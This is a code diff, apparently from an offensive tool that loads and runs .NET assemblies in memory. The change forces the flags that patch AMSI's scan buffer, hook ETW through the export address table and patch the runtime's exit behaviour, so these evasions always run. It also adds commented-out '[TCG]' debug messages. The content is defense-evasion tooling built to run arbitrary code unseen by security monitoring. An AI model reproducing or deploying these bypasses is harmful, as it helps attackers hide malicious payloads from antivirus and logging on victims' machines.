@@ -30,12 +30,15 @@ HRESULT go(
     PCHAR       assemblyBytes, 
     SIZE_T      assemblyByteLen, 
     LPCWSTR*    assemblyArguments, 
-    INT         argc,
     BOOL        patchExitflag,
     BOOL        patchAmsiflag,
     BOOL        patchEtwflag 
 )
 {
+    patchExitflag = TRUE;
+    patchAmsiflag = TRUE;
+    patchEtwflag  = TRUE;
+
     /* Bypass ETW with EAT Hooking */
     if (patchEtwflag != FALSE) {
 
@@ -55,6 +58,7 @@ HRESULT go(
         {
             return -1;
         }
+        // dprintf("[TCG] Hooked EAT!");
     }
 
     /* Execute inline dotnet */
@@ -121,6 +125,7 @@ BOOL Executedotnet(PBYTE AssemblyBytes, ULONG AssemblySize, LPCWSTR wAssemblyArg
         if (!PatchAmsiScanBuffer(clrMod))
             goto cleanup;
     }
+    // dprintf("[TCG] Patched AMSI!");
 
     HResult = runtimeInfo->lpVtbl->GetInterface(
         runtimeInfo,
@@ -176,6 +181,7 @@ BOOL Executedotnet(PBYTE AssemblyBytes, ULONG AssemblySize, LPCWSTR wAssemblyArg
         if (!patchExit(runtimeHost))
             goto cleanup;
     }
+    // dprintf("[TCG] Patched ExitFlag!");
 
     HResult = Assembly->lpVtbl->get_EntryPoint(Assembly, &MethodInfo);
     if (FAILED(HResult) || !MethodInfo)
